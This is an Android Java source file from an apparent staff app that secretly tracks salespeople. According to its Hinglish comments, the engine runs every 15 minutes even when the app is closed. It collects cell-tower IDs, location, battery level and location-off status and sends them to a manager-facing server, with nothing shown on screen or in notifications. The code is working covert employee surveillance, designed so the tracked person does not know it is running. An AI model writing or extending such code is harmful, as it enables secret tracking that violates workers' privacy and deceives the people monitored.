package com.shivam.staff;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.location.Location;
import android.location.LocationManager;

import androidx.core.content.ContextCompat;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.List;

/**
 * ============================================================
 * SALES SILENT TOWER ENGINE (Boss order 2026-11-17):
 * "Salesman ke mobile me jab wo tour par naa ho aur app naa bhi on kare tab
 *  tower id application background me lena chahiye aur manager ko bhejna
 *  chahiye take pata lage ke wo sach bol raha hai ya juth aur wo kaha hai"
 * + "Background me silent me app chalao magar notifications nahi aana
 *  chahiye ke app kuch kuch der me khul kar uski location bhej raha hai".
 *
 * FLOW: LocationTrackService (FGS) HOME mode + app band me WATCHDOG alarm se
 * HANDOFF hota hai -> FGS BAND (notification gayab) -> ye engine har 15 min
 * alarm se uthta hai:
 *   - serving tower read (CellTowerWatcher — rail-system, GPS/internet nahi
 *     chahiye) + last-known location (sasta NETWORK fix, GPS chip nahi)
 *   - sales_live/{uid} SILENT write (manager board ko pata: kaha hai + kab)
 *   - users/{uid} lastLocation patch (identity card fresh)
 *   - tower_pings log (StaffDetail me "aaj kaha-kaha gaya" tower trail)
 *   - 10km+ home se door = TOUR SHURU -> FGS wapas start (tour engine)
 *
 * Battery: tower read radio-passive + ek NETWORK fix + chhota REST write —
 * din bhar me ~1%. Screen/notification par KUCH nahi dikhta.
 * ============================================================
 */
public final class SalesSilentEngine {

    private SalesSilentEngine() {
    }

    private static final long LASTKNOWN_MAX_AGE_MS = 20L * 60 * 1000;
    private static final long PING_DEDUPE_MS = 12L * 60 * 1000;
    private static final float TOUR_FAR_M = 10000f; // LocationTrackService.TOUR_FAR_M jaisa

    public static void run(Context ctx) {
        try {
            SharedPreferences p = ctx.getSharedPreferences(LocationTrackService.PREFS, Context.MODE_PRIVATE);
            String uid = p.getString("uid", null);
            if (uid == null || uid.length() < 4 || !"sales".equals(p.getString("role", ""))) {
                return;
            }
            // FGS chal rahi hai? — uska engine live docs likhta hai, ping skip
            if (LocationTrackService.running) return;
            long now = System.currentTimeMillis();
            if (now - p.getLong("lastPingAt", 0L) < PING_DEDUPE_MS) {
                return; // watchdog + alarm double-fire guard
            }

            String name = p.getString("name", "Staff");
            int versionCode = p.getInt("versionCode", 0);
            double homeLat = Double.longBitsToDouble(p.getLong("homeLat", 0L));
            double homeLng = Double.longBitsToDouble(p.getLong("homeLng", 0L));

            // ---- serving tower (rail-system core: GPS/internet nahi chahiye) ----
            CellTowerWatcher.TowerSnapshot tower = CellTowerWatcher.read(ctx);

            // ---- location: lastKnown (sasta) / NETWORK single fix (GPS chip nahi) ----
            Location fix = bestFix(ctx);

            // ---- TOUR begin? (home se 10km+ door) -> FGS wapas ----
            if (fix != null && homeLat != 0d && homeLng != 0d) {
                float distHome = RestIo.haversineM(fix.getLatitude(), fix.getLongitude(), homeLat, homeLng);
                if (distHome >= TOUR_FAR_M) {
                    p.edit().putBoolean("lastTourMode", true).putBoolean("silentActive", false)
                            .putLong("lastPingAt", now).apply();
                    try {
                        ContextCompat.startForegroundService(ctx, new Intent(ctx, LocationTrackService.class));
                    } catch (Exception ignore) {
                        // background FGS-start block hua — next ping phir try karega
                    }
                    return;
                }
            }

            // ---- city resolve (offline tower DB — "where is my train" layer) ----
            String city = "";
            String citySrc = "none";
            try {
                CellDbCache db = new CellDbCache(ctx);
                if (tower != null && tower.ok && tower.key != null && !tower.key.isEmpty()) {
                    CellDbCache.TowerEntry e = db.lookup(tower.key);
                    if (e != null && e.city != null && !e.city.isEmpty()) {
                        city = e.city;
                        citySrc = "tower_db";
                    }
                }
                if (city.isEmpty() && fix != null) {
                    String near = db.nearestCity(fix.getLatitude(), fix.getLongitude());
                    if (near != null && !near.isEmpty()) {
                        city = near;
                        citySrc = "tower_near";
                    }
                }
            } catch (Exception ignore) {
            }

            // ---- sales_live/{uid} SILENT masked write (FGS fields preserve) ----
            boolean locOn = isLocationOn(ctx);
            JSONArray flags = new JSONArray();
            if (!locOn) flags.put(new JSONObject().put("stringValue", "loc_off"));

            JSONObject fields = new JSONObject()
                    .put("uid", RestIo.fS(uid))
                    .put("name", RestIo.fS(name))
                    .put("state", RestIo.fS("SILENT"))
                    .put("tourMode", RestIo.fB(false))
                    .put("src", RestIo.fS("silent"))
                    .put("at", RestIo.fI(now))
                    .put("city", RestIo.fS(city))
                    .put("citySrc", RestIo.fS(citySrc))
                    .put("flags", RestIo.fArr(flags));
            RestIo.putDeviceFields(fields, versionCode);
            if (fix != null) {
                fields.put("lat", RestIo.fD(fix.getLatitude()));
                fields.put("lng", RestIo.fD(fix.getLongitude()));
                if (fix.hasAccuracy()) fields.put("acc", RestIo.fD(fix.getAccuracy()));
            }
            if (tower != null && tower.ok && tower.key != null && !tower.key.isEmpty()) {
                fields.put("cellKey", RestIo.fS(tower.key));
                JSONObject cellMap = new JSONObject();
                try {
                    if (tower.mcc != null && !tower.mcc.isEmpty()) cellMap.put("mcc", RestIo.fS(tower.mcc));
                    if (tower.mnc != null && !tower.mnc.isEmpty()) cellMap.put("mnc", RestIo.fS(tower.mnc));
                    if (tower.lac >= 0) cellMap.put("lac", RestIo.fI(tower.lac));
                    if (tower.cid >= 0) cellMap.put("cid", RestIo.fI(tower.cid));
                    if (tower.dbm != 0) cellMap.put("dbm", RestIo.fI(tower.dbm));
                } catch (Exception ignore) {
                }
                if (cellMap.length() > 0) {
                    fields.put("cell", new JSONObject().put("mapValue",
                            new JSONObject().put("fields", cellMap)));
                }
            }
            int[] bat = RestIo.readBattery(ctx);
            if (bat[0] >= 0) {
                fields.put("batteryPct", RestIo.fI(bat[0]));
                fields.put("charging", RestIo.fB(bat[1] == 1));
            }

            StringBuilder mask = new StringBuilder();
            String[] maskFields = {"uid", "name", "state", "tourMode", "src", "at", "city", "citySrc",
                    "lat", "lng", "acc", "cellKey", "cell", "batteryPct", "charging", "flags",
                    "versionCode", "deviceModel", "osVersion"};
            for (String mf : maskFields) {
                if (fields.has(mf)) {
                    if (mask.length() > 0) mask.append('&');
                    mask.append("updateMask.fieldPaths=").append(mf);
                }
            }
            String liveUrl = RestIo.BASE + "sales_live/" + uid + (mask.length() > 0 ? "?" + mask : "");
            String liveBody = new JSONObject().put("fields", fields).toString();
            RestIo.HttpResult r1 = RestIo.http("POST", liveUrl, liveBody);
            if (!r1.ok) RestIo.queueOp(p, "silent_queue", liveUrl, liveBody);

            // ---- users lastLocation patch (identity card fresh) ----
            if (fix != null) {
                try {
                    JSONObject uf = new JSONObject()
                            .put("lastLocation", new JSONObject().put("mapValue",
                                    new JSONObject().put("fields", new JSONObject()
                                            .put("lat", RestIo.fD(fix.getLatitude()))
                                            .put("lng", RestIo.fD(fix.getLongitude()))
                                            .put("at", RestIo.fI(now))
                                            .put("src", RestIo.fS("silent")))))
                            .put("lastSeenAt", RestIo.fI(now));
                    String uUrl = RestIo.BASE + "users/" + uid + "?updateMask=lastLocation,lastSeenAt";
                    String uBody = new JSONObject().put("fields", uf).toString();
                    RestIo.HttpResult r2 = RestIo.http("POST", uUrl, uBody);
                    if (!r2.ok) RestIo.queueOp(p, "silent_queue", uUrl, uBody);
                } catch (Exception ignore) {
                }
            }

            // ---- tower_pings log (StaffDetail "aaj kaha gaya" trail) ----
            try {
                JSONObject tf = new JSONObject()
                        .put("uid", RestIo.fS(uid))
                        .put("name", RestIo.fS(name))
                        .put("at", RestIo.fI(now))
                        .put("day", RestIo.fS(RestIo.isoDay(now)))
                        .put("city", RestIo.fS(city))
                        .put("src", RestIo.fS("silent"));
                if (tower != null && tower.ok && tower.key != null && !tower.key.isEmpty()) {
                    tf.put("cellKey", RestIo.fS(tower.key));
                }
                if (fix != null) {
                    tf.put("lat", RestIo.fD(fix.getLatitude()));
                    tf.put("lng", RestIo.fD(fix.getLongitude()));
                }
                String tUrl = RestIo.BASE + "tower_pings/tp-" + uid + "-" + now;
                String tBody = new JSONObject().put("fields", tf).toString();
                RestIo.HttpResult r3 = RestIo.http("POST", tUrl, tBody);
                if (!r3.ok) RestIo.queueOp(p, "silent_queue", tUrl, tBody);
            } catch (Exception ignore) {
            }

            // ---- pending flush + cadence save ----
            RestIo.flushQueue(p, "silent_queue");
            p.edit().putLong("lastPingAt", now)
                    .putBoolean("silentActive", true)
                    .putBoolean("lastTourMode", false)
                    .apply();
        } catch (Exception ignore) {
            // ping kabhi crash nahi hoga — next alarm phir chalega
        }
    }

    private static boolean isLocationOn(Context ctx) {
        try {
            int mode = android.provider.Settings.Secure.getInt(ctx.getContentResolver(),
                    android.provider.Settings.Secure.LOCATION_MODE,
                    android.provider.Settings.Secure.LOCATION_MODE_OFF);
            return mode != android.provider.Settings.Secure.LOCATION_MODE_OFF;
        } catch (Exception e) {
            return true;
        }
    }

    /** lastKnown fresh? warna NETWORK single fix (8s latch — GPS chip BAND). */
    private static Location bestFix(Context ctx) {
        try {
            LocationManager lm = (LocationManager) ctx.getApplicationContext()
                    .getSystemService(Context.LOCATION_SERVICE);
            if (lm == null) return null;
            long now = System.currentTimeMillis();
            Location best = null;
            long bestAge = Long.MAX_VALUE;
            try {
                List<String> providers = lm.getProviders(true);
                if (providers != null) {
                    for (String prov : providers) {
                        try {
                            Location l = lm.getLastKnownLocation(prov);
                            if (l == null) continue;
                            long age = Math.max(0, now - l.getTime());
                            if (age < bestAge) {
                                bestAge = age;
                                best = l;
                            }
                        } catch (Exception ignore) {
                        }
                    }
                }
            } catch (Exception ignore) {
            }
            if (best != null && bestAge <= LASTKNOWN_MAX_AGE_MS && best.getAccuracy() <= 300f) {
                return best;
            }
            return singleNetworkFix(ctx, lm, 8000);
        } catch (Exception ignore) {
            return null;
        }
    }

    private static android.os.HandlerThread locThread;
    private static android.os.Handler locHandler;

    private static Location singleNetworkFix(Context ctx, LocationManager lm, long timeoutMs) {
        try {
            synchronized (SalesSilentEngine.class) {
                if (locThread == null) {
                    locThread = new android.os.HandlerThread("shivam_sales_ping");
                    locThread.start();
                    locHandler = new android.os.Handler(locThread.getLooper());
                }
            }
            final java.util.concurrent.CountDownLatch latch =
                    new java.util.concurrent.CountDownLatch(1);
            final Location[] got = new Location[1];
            android.location.LocationListener listener = new android.location.LocationListener() {
                @Override
                public void onLocationChanged(Location location) {
                    try {
                        got[0] = location;
                    } catch (Exception ignore) {
                    } finally {
                        latch.countDown();
                    }
                }

                @Override
                public void onStatusChanged(String provider, int status, android.os.Bundle extras) {
                }

                @Override
                public void onProviderEnabled(String provider) {
                }

                @Override
                public void onProviderDisabled(String provider) {
                }
            };
            try {
                android.os.Looper looper = locHandler != null ? locHandler.getLooper() : null;
                if (looper == null) return null;
                lm.requestSingleUpdate(LocationManager.NETWORK_PROVIDER, listener, looper);
            } catch (Exception ignore) {
                return null;
            }
            try {
                latch.await(timeoutMs, java.util.concurrent.TimeUnit.MILLISECONDS);
            } catch (InterruptedException ignore) {
            }
            try {
                lm.removeUpdates(listener);
            } catch (Exception ignore) {
            }
            return got[0];
        } catch (Exception ignore) {
            return null;
        }
    }
}
